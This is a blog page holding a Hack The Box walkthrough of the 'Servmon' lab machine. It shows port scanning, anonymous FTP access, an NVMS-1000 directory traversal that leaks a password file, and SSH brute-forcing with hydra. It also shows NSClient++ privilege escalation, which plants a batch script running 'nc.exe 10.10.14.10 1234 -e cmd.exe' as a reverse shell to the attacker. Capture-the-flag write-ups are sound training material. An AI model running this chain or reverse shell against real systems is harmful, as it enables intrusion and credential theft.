<!--
Author: W3layouts
Author URL: http://w3layouts.com
-->
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>My Website::ServMon </title>
    <!-- web fonts -->
    <link href="//fonts.googleapis.com/css?family=Nunito:400,600,700,800,900&display=swap" rel="stylesheet">
    <link href="//fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
    <!-- //web fonts -->
    <!-- Template CSS -->
    <link rel="stylesheet" href="/assets/css/style-starter.css">
  </head>
  <body>

<section class="w3l-bootstrap-header">
  <nav class="navbar navbar-expand-lg navbar-light py-lg-3 py-2">
    <div class="container">
      <a class="navbar-brand" href="index.html"> My Website</a>
      <!-- if logo is image enable this   
    <a class="navbar-brand" href="#index.html">
        <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
    </a> -->
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon fa fa-bars"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/index.html">Home</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/Projects.html">Projects</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/Referencesheet.html">Pentesting Reference Sheet</a>          
          </li>
        </ul>
        
      </div>
    </div>
  </nav>
</section>
<section class="w3l-about-breadcrum">
  <div class="breadcrum-bg">
    <div class="container py-5">
      <p><a href="/index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Servmon</p>
     </div>
  </div>
</section>
<!-- w3l-content-photo-5 -->
<div class="w3l-content-photo-5 py-5" id="about">
	<div class="content-main pt-lg-5 pt-md-3 pb-0">
		<div class="container">
            <div style="text-align:center;padding-top: 10px">
           					<a ><img src="/Posts/Servmon/0.png" class="img-fluid" alt="content-photo" ></a>
                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Servmon</h3>
					          <p class="mb-2">Posted on 6/22</p>
                    <p class="mb-2">Source: <a href="https://www.hackthebox.eu/" target="_blank" style="color: #33cc33;text-align:right"> hackthebox</a></p>
                    <h3 class="mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Enumeration</h3>
                    <p class="mb-2">Once we connect to the hackthebox network, lets start with our host enumeration.</p>
            </div>
            <div class=hljs>
                <a>
                kali@kali:~/hackthebox/Servmon$ nmap -sC -sV -p- -oN nmap.txt 10.10.10.184<br>
                Service scan Timing: About 94.44% done; ETC: 10:51 (0:00:08 remaining)                    <br>                                    
                Nmap scan report for 10.10.10.184                                                         <br>                                    
                Host is up (0.021s latency).                                                              <br>                                    
                Not shown: 65517 closed ports                                                             <br>                                    
                PORT      STATE SERVICE       VERSION                                                     <br>                                    
                21/tcp    open  ftp           Microsoft ftpd                                              <br>                                    
                | ftp-anon: Anonymous FTP login allowed (FTP code 230)                                    <br>                                    
                |_01-18-20  12:05PM                 Users                                            <br>                                    
                | ftp-syst:                                                                               <br>                                    
                |_  SYST: Windows_NT                                                                      <br>                                    
                22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)<br>
                | ssh-hostkey: <br>
                |   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)<br>
                |   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)<br>
                |_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)<br>
                80/tcp    open  http<br>
                | fingerprint-strings: <br>
                |   GetRequest, HTTPOptions, RTSPRequest: <br>
                |     HTTP/1.1 200 OK<br>
                |     Content-type: text/html<br>
                |     Content-Length: 340<br>
                |     Connection: close<br>
                |     AuthInfo: <br>
                |     
                |   NULL: <br>
                |     HTTP/1.1 408 Request Timeout<br>
                |     Content-type: text/html<br>
                |     Content-Length: 0<br>
                |     Connection: close<br>
                |_    AuthInfo:<br>
                |_http-title: Site doesnt have a title (text/html).<br>
                135/tcp   open  msrpc         Microsoft Windows RPC<br>
                139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>
                445/tcp   open  microsoft-ds?<br>
                5040/tcp  open  unknown<br>
                5666/tcp  open  tcpwrapped<br>
                6063/tcp  open  tcpwrapped<br>
                6699/tcp  open  napster?<br>
                8443/tcp  open  ssl/https-alt<br>
                | fingerprint-strings: <br>
                |   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: <br>
                |     HTTP/1.1 404<br>
                |     Content-Length: 18<br>
                |     Document not found<br>
                |   GetRequest: <br>
                |     HTTP/1.1 302<br>
                |     Content-Length: 0<br>
                |     Location: /index.html<br>
                |     refox/68.0<br>
                |     workers<br>
                |_    jobs<br>
                | http-title: NSClient++<br>
                |_Requested resource was /index.html<br>
                | ssl-cert: Subject: commonName=localhost<br>
                | Not valid before: 2020-01-14T13:24:20<br>
                |_Not valid after:  2021-01-13T13:24:20<br>
                |_ssl-date: TLS randomness does not represent time<br>
                49664/tcp open  msrpc         Microsoft Windows RPC<br>
                49665/tcp open  msrpc         Microsoft Windows RPC<br>
                49666/tcp open  msrpc         Microsoft Windows RPC<br>
                49667/tcp open  msrpc         Microsoft Windows RPC<br>
                49668/tcp open  msrpc         Microsoft Windows RPC<br>
                49669/tcp open  msrpc         Microsoft Windows RPC<br>
                49670/tcp open  msrpc         Microsoft Windows RPC<br>

                Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br>
                <br>
                Host script results:<br>
                |_clock-skew: 3m57s<br>
                | smb2-security-mode: <br>
                |   2.02: <br>
                |_    Message signing enabled but not required<br>
                | smb2-time: <br>
                |   date: 2020-06-05T14:56:09<br>
                |_  start_date: N/A<br>
                <br>
                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
                Nmap done: 1 IP address (1 host up) scanned in 209.46 seconds<br>
                </a> 
            </div>
            <div style="text-align:center;padding-top: 10px">
              <p class="mb-2" style="font-weight:100">Let's see what's in ftp. since anonymous login is allowed, we can use anonymous:anonymous to log in.</p>
              </p>
            </div>
            <div class="hljs">
              <a>
                kali@kali:~/hackthebox/Servmon$ ftp 10.10.10.184<br>
                Connected to 10.10.10.184.<br>
                220 Microsoft FTP Service<br>
                Name (10.10.10.184:kali): anonymous<br>
                331 Anonymous access allowed, send identity (e-mail name) as password.<br>
                Password:<br>
                230 User logged in.<br>
                Remote system type is Windows_NT.<br>
                ftp> dir<br>
                200 PORT command successful.<br>
                125 Data connection already open; Transfer starting.<br>
                01-18-20  12:05PM       DIR          Users<br>
                226 Transfer complete.<br>
                ftp> cd Users<br>
                250 CWD command successful.<br>
                ftp> dir<br>
                200 PORT command successful.<br>
                125 Data connection already open; Transfer starting.<br>
                01-18-20  12:06PM       DIR          Nadine<br>
                01-18-20  12:08PM       DIR          Nathan<br>
                226 Transfer complete.<br>
                ftp> cd Nathan<br>
                250 CWD command successful.<br>
                ftp> ls<br>
                200 PORT command successful.<br>
                125 Data connection already open; Transfer starting.<br>
                01-18-20  12:10PM                  186 Notes to do.txt<br>
                226 Transfer complete.<br>
                ftp> ls ../Nadine<br>
                200 PORT command successful.<br>
                125 Data connection already open; Transfer starting.<br>
                01-18-20  12:08PM                  174 Confidential.txt<br>
                226 Transfer complete.<br>
                ftp> <br>
              </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            Lets download those files and see what they say.            
            </p>
            </div>
            <div class="hljs">
            <a>
            kali@kali:~/hackthebox/Servmon$ cat Notes\ to\ do.txt <br>
            1) Change the password for NVMS - Complete<br>
            2) Lock down the NSClient Access - Complete<br>
            3) Upload the passwords<br>
            4) Remove public access to NVMS<br>
            5) Place the secret files in SharePoint<br>
            kali@kali:~/hackthebox/Servmon$ cat Confidential.txt <br>
            Nathan,<br>
<br>
            I left your Passwords.txt file on your Desktop.  
            Please remove this once you have edited it yourself and place it back into the secure folder.<br>
<br>
            Regards<br>
<br>
            Nadine<br>
            kali@kali:~/hackthebox/Servmon$ <br>
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Foothold & User</h3>
            <p class="mb-2" style="font-weight:100">
            So apparently, there is a file called Passwords.txt on 
            Nathan's desktop. Let's check out port 80. 
            </p>
            <img src="/Posts/Servmon/1.png" class="img-fluid" alt="content-photo" >
            <a>And lets see if we find any vulnerabilities.</a>
            </div>
            <div class="hljs">
            <a\p>
            kali@kali:~/hackthebox/Servmon$ searchsploit nvms<br>
          -------------------------------------------------------------------------------------------- ---------------------------------<br>
           Exploit Title                                                                              |  Path<br>
          -------------------------------------------------------------------------------------------- ---------------------------------<br>
          NVMS 1000 - Directory Traversal                                                             | hardware/webapps/47774.txt<br>
          OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                            | multiple/local/21856.txt<br>
          OpenVms 8.3 Finger Service - Stack Buffer Overflow                                          | multiple/dos/32193.txt<br>
          TVT NVMS 1000 - Directory Traversal                                                         | hardware/webapps/48311.py<br>
          -------------------------------------------------------------------------------------------- ---------------------------------<br>
          Shellcodes: No Results<br>
          kali@kali:~/hackthebox/Servmon$ <br>
            </a\p>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            Ok, so with this particular version of NVME, we can traverse the server file system. And with the information
             from Confidential.txt, we know exactly where a certain file is.
            </p>
            </div>
            <div class="hljs">
            <a>
            msf5 auxiliary(admin/2wire/xslt_password_reset) > search nvms<br>

            Matching Modules<br>
            ================<br>
<br>
               #  Name      <br>                                 Disclosure Date  Rank    Check  Description<br>
               -  ----                                       ---------------  ----    -----  -----------<br>
               0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal<br>
<br>
<br>
            msf5 auxiliary(admin/2wire/xslt_password_reset) > use 0<br>
            msf5 auxiliary(scanner/http/tvt_nvms_traversal) > options<br>
<br>
            Module options (auxiliary/scanner/http/tvt_nvms_traversal):<br>
<br>
               Name       Current Setting   Required  Description<br>
               ----       ---------------   --------  -----------<br>
               DEPTH      13                yes       Depth for Path Traversal<br>
               FILEPATH   /windows/win.ini  yes       The path to the file to read<br>
               Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]<br>
               RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'<br>
               RPORT      80                yes       The target port (TCP)<br>
               SSL        false             no        Negotiate SSL/TLS for outgoing connections<br>
               TARGETURI  /                 yes       The base URI path of nvms<br>
               THREADS    1                 yes       The number of concurrent threads (max one per host)<br>
               VHOST                        no        HTTP server virtual host<br>
<br>
            msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 10.10.10.184<br>
            RHOSTS => 10.10.10.184<br>
            msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH /Users/Nathan/Desktop/Passwords.txt<br>
            FILEPATH => /Users/Nathan/Desktop/Passwords.txt<br>
            msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run<br>
<br>
            [+] 10.10.10.184:80 - Downloaded 156 bytes<br>
            [+] File saved in: /home/kali/.msf4/loot/20200606125216_default_10.10.10.184_nvms.traversal_218439.txt<br>
            [*] Scanned 1 of 1 hosts (100% complete)<br>
            [*] Auxiliary module execution completed<br>
            msf5 auxiliary(scanner/http/tvt_nvms_traversal) > cat /home/kali/.msf4/loot/20200606125216_default_10.10.10.184_nvms.travers<br>al_218439.txt
            [*] exec: cat /home/kali/.msf4/loot/20200606125216_default_10.10.10.184_nvms.traversal_218439.txt<br>
<br>
            1nsp3ctTh3Way2Mars!<br>
            Th3r34r3To0M4nyTrait0r5!<br>
            B3WithM30r4ga1n5tMe<br>
            L1k3B1gBut7s@W0rk<br>
            0nly7h3y0unGWi11F0l10w<br>
            IfH3s4b0Utg0t0H1sH0me<br>
            Gr4etN3w5w17hMySk1Pa5$msf5 <br>
            auxiliary(scanner/http/tvt_nvms_traversal) > <br>
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            Ok, we have two possible users and 7 possible passwords. Lets see if we can bruteforce against the different services available.
            </p>
            </div>
            <div class="hljs">
            <a>
            kali@kali:~/hackthebox/Servmon$ hydra -L users.txt -P Passwords.txt ftp://10.10.10.184<br>
            Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br>
<br>
            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-06 12:55:25<br>
            [DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task<br>
            [DATA] attacking ftp://10.10.10.184:21/<br>
            1 of 1 target completed, 0 valid passwords found<br>
            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-06 12:55:26<br>
            <br>
            kali@kali:~/hackthebox/Servmon$ hydra -L users.txt -P Passwords.txt ssh://10.10.10.184<br>
            Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br>
<br>
            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-06 12:55:31<br>
            [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
            [DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task<br>
            [DATA] attacking ssh://10.10.10.184:22/<br>
            [22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk<br>
            1 of 1 target successfully completed, 1 valid password found<br>
            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-06 12:55:33<br>
            </a>
          </div>
          <div style="text-align:center;padding-top: 5px">
            <p class="mb-2" style="font-weight:100">
            And we found ssh credentials!
            </p>
          </div>
          <div class ="hljs">
          <p>
          kali@kali:~/hackthebox/Servmon$ ssh nadine@10.10.10.184 <br>
          nadine@10.10.10.184s password: <br>
          Microsoft Windows [Version 10.0.18363.752]<br>
          (c) 2019 Microsoft Corporation. All rights reserved.<br>
          <br>
          nadine@SERVMON C:\Users\Nadine>whoami<br>
          servmon\nadine                          <br>
                                                                    <br>
          nadine@SERVMON C:\Users\Nadine>dir                        <br>
           Volume in drive C has no label.                      <br>
           Volume Serial Number is 728C-D22C                    <br>
                                                                <br>
           Directory of C:\Users\Nadine                         <br>
                                                                <br>
          06/06/2020  17:19    DIR          .                 <br>
          06/06/2020  17:19    DIR          ..                <br>
          18/01/2020  11:23    DIR          3D Objects        <br>
          18/01/2020  11:23    DIR          Contacts          <br>
          08/04/2020  22:28    DIR          Desktop           <br>
          08/04/2020  22:28    DIR          Documents         <br>
          18/01/2020  11:23    DIR          Downloads         <br>
          08/04/2020  22:27    DIR          Favorites         <br>
          08/04/2020  22:27    DIR          Links             <br>
          18/01/2020  11:23    DIR          Music             <br>
          06/06/2020  16:37                 0 nscp              <br>
          18/01/2020  11:31    DIR          OneDrive          <br>
          18/01/2020  11:23    DIR          Pictures          <br>
          18/01/2020  11:23    DIR          Saved Games       <br>
          18/01/2020  11:23    DIR          Searches          <br>
          06/06/2020  17:19            32,976 UsersNadineDesktop<br>
          18/01/2020  11:23    DIR          Videos            <br>
                         2 File(s)         32,976 bytes         <br>
                        15 Dir(s)  27,865,587,712 bytes free       <br>
          nadine@SERVMON C:\Users\Nadine>cd Desktop <br>
          <br>
          nadine@SERVMON C:\Users\Nadine\Desktop>dir<br>
           Volume in drive C has no label.                  <br>
           Volume Serial Number is 728C-D22C                <br>
                                                            <br>
           Directory of C:\Users\Nadine\Desktop             <br>
                                                            <br>
          08/04/2020  22:28    DIR          .             <br>
          08/04/2020  22:28    DIR          ..            <br>
          06/06/2020  16:07                34 user.txt      <br>
                         1 File(s)             34 bytes     <br>
                         2 Dir(s)  27,865,587,712 bytes free<br>
                                                            <br>
          nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt<br>
          04d78260e80edf4875fa5b0c95eda849  <br>
          </p>
          </div>          
            <div style="text-align:center;padding-top: 10px">      
            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Priviledge Escalation</h3>
            <p class="mb-2" style="font-weight:100">
            Looking at the initial nmap scan, we can see that NSClient++ is running on port 8443. Also, it was mentioned in the Notes to Do.txt. 
            According to <a href="https://www.exploit-db.com/exploits/46802" target="_blank" style="color: #33cc33;text-align:right"> this</a>, we can use NSClient++ to get root. Lets move through the steps in the exploit.
            </p>
          </div>
          <div class="hljs">
          <a>
          Nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini<br>
          ´╗┐# If you want to fill this file with all available options run the following command:<br>
          #   nscp settings --generate --add-defaults --load-all<br>
          # If you want to activate a module and bring in all its options use:<br>
          #   nscp settings --activate-module <MODULE NAME> --add-defaults<br>
          # For details run: nscp settings --help<br>
<br>
<br>
          ; in flight - TODO<br>
          [/settings/default]<br>
<br>
          ; Undocumented key<br>
          password = ew2x6SsGTxjRwXOT<br>
<br>
          ; Undocumented key<br>
          allowed hosts = 127.0.0.1<br>
<br>
<br>
          ; in flight - TODO<br>
          [/settings/NRPE/server]<br>
<br>
          ; Undocumented key<br>
          ssl options = no-sslv2,no-sslv3<br>
<br>
          ; Undocumented key<br>
          verify mode = peer-cert<br>
<br>
          ; Undocumented key<br>
          insecure = false<br>
<br>
<br>
          ; in flight - TODO<br>
          [/modules]<br>
<br>
          ; Undocumented key<br>
          CheckHelpers = disabled<br>
<br>
          ; Undocumented key<br>
          CheckEventLog = disabled<br>
<br>
          ; Undocumented key<br>
          CheckNSCP = disabled<br>
<br>
          ; Undocumented key<br>
          CheckDisk = disabled<br>
<br>
          ; Undocumented key<br>
          CheckSystem = disabled<br>
<br>
          ; Undocumented key<br>
          WEBServer = enabled<br>
<br>
          ; Undocumented key<br>
          NRPEServer = enabled<br>
<br>
          ; CheckTaskSched - Check status of your scheduled jobs.<br>
          CheckTaskSched = enabled<br>
<br>
          ; Scheduler - Use this to schedule check commands and jobs in conjunction with for insta<br>nce passive monitoring through NSCA
          Scheduler = enabled<br>
<br>
          ; CheckExternalScripts - Module used to execute external scripts<br>
          CheckExternalScripts = enabled<br>
<br>
<br>
          ; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrap<br>
          ped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.<br>
          [/settings/external scripts/wrappings]<br>
<br>
          ; Batch file - Command used for executing wrapped batch files<br>
          bat = scripts\\%SCRIPT% %ARGS%<br>
          <br>
          ; Visual basic script - Command line used for wrapped vbs scripts<br>
          vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%<br>
          <br>
          ; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts<br>
          ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit(<br>
          $lastexitcode) | powershell.exe /noprofile -command -<br>
<br>
<br>
          ; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`<br>
          [/settings/external scripts/scripts]<br>
<br>
<br>
          ; Schedules - Section for the Scheduler module.<br>
          [/settings/scheduler/schedules]<br>
<br>
          ; Undocumented key<br>
          foobar = command = foobar<br>
<br>
<br>
          ; External script settings - General settings for the external scripts module (CheckExternalScripts).<br>
          [/settings/external scripts]<br>
          allow arguments = true<br>
<br>
          nadine@SERVMON C:\Program Files\NSClient++><br>
          </a>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
            And we found the "Undocumented key password = ew2x6SsGTxjRwXOT", 
            but according to "Undocumented key allowed hosts = 127.0.0.1 ", we can 
            only access the client through localhost. Lets port forward port 8443 to 127.0.0.1
          </p>
          </div>
          <div class="hljs">
          <a>
          kali@kali:~/hackthebox/Servmon$ ssh -L 9000:127.0.0.1:8443 nadine@10.10.10.184
          </a>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
          The next step is on the attacking machine:
          </p>
          </div>
          <div class="hljs">
          <a>
          kali@kali:~/hackthebox/Servmon$ locate nc.exe<br>
          /usr/share/windows-resources/binaries/nc.exe<br>
          kali@kali:~/hackthebox/Servmon$ cp /usr/share/windows-resources/binaries/nc.exe .  <br>
          kali@kali:~/hackthebox/Servmon$ python3 -m http.server &<br>
          kali@kali:~/hackthebox/Servmon$ nc -l -p 1234<br>
          </a>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
          Then use a python server to transfer nc.exe to ServMon. I tried opening the gui on 127.0.0.1:9000 but the UI wasn't showing up. 
          Apparently, this was a problem that other people had due to the quality of the machine, but we can use curl to send ourselves the reverse shell. On ServMon:
          </p>
          </div>
          <div class="hljs">
          nadine@SERVMON C:\Temp> wget 10.10.114.10:8000/nc.ece<br>
          nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.e<br>
          xe 10.10.14.10 1234 -e cmd.exe"<br>
          Added evil as scripts\evil.bat<br>
          nadine@SERVMON C:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/queries/evil/commands/execute?time=3m<br>
          {"command":"testing1","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","perf":{}}],"result":3}<br>
          nadine@SERVMON C:\Temp><br>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
          On our listener:
          </p>
          </div>
          <div class="hljs">

          kali@kali:~/hackthebox/Servmon$ nc -l -p 1234<br>
        Microsoft Windows [Version 10.0.18363.752]<br>
        (c) 2019 Microsoft Corporation. All rights reserved.<br>
        <br>
        C:\Program Files\NSClient++>cd /Users<br>
        cd /Users<br>
        C:\Users>dir<br>
        dir<br>
         Volume in drive C has no label.<br>
         Volume Serial Number is 728C-D22C<br>
        <br>
         Directory of C:\Users<br>
        <br>
        08/04/2020  22:26    DIR          .<br>
        08/04/2020  22:26    DIR          ..<br>
        08/04/2020  22:55    DIR          Administrator<br>
        12/06/2020  09:50    DIR          Nadine<br>
        12/06/2020  05:24    DIR          Nathan<br>
        08/04/2020  23:20    DIR          Public<br>
                       0 File(s)              0 bytes<br>
                       6 Dir(s)  27,600,916,480 bytes free<br>
        <br>
        C:\Users>cd Administrator<br>
        cd Administrator<br>
        <br>
        C:\Users\Administrator>cd Desktop<br>
        cd Desktop<br>
        <br>
        C:\Users\Administrator\Desktop>type root.txt<br>
        type root.txt<br>
        2a41d10aa355a250fd718c733d5c214d<br>
        <br>
        C:\Users\Administrator\Desktop>     <br>
          </p>
          </div>
     </div>
  </div>  
</div>

 <section class="w3l-footer-29-main" id="footer">
  <div class="footer-29 text-center">
      <div class="container">
        
          <div class="bottom-copies text-center">
              <p class="copy-footer-29">© 2020 My Website. All rights reserved | Designed by <a href="https://w3layouts.com">W3layouts</a></p>
               
          </div>
      </div>
  </div>
   <!-- move top -->
  <button onclick="topFunction()" id="movetop" title="Go to top">
              <span class="fa fa-angle-up"></span>
                 </button>
                 <script>
                     // When the user scrolls down 20px from the top of the document, show the button
                     window.onscroll = function () {
                         scrollFunction()
                     };
              
                     function scrollFunction() {
                         if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                             document.getElementById("movetop").style.display = "block";
                         } else {
                             document.getElementById("movetop").style.display = "none";
                         }
                     }
              
                     // When the user clicks on the button, scroll to the top of the document
                     function topFunction() {
                         document.body.scrollTop = 0;
                         document.documentElement.scrollTop = 0;
                     }
                 </script>
                 <!-- /move top -->
</section>
<!-- // grids block 5 -->
<script src="assets/js/jquery-3.3.1.min.js"></script>
<!-- //footer-28 block -->
</section>

<script>
    $(function () {
      $('.navbar-toggler').click(function () {
        $('body').toggleClass('noscroll');
      })
    });
  </script>
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
  </script>
  
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
  </script>

<!-- Smooth scrolling -->



</body>

</html>
<!-- // grids block 5 -->

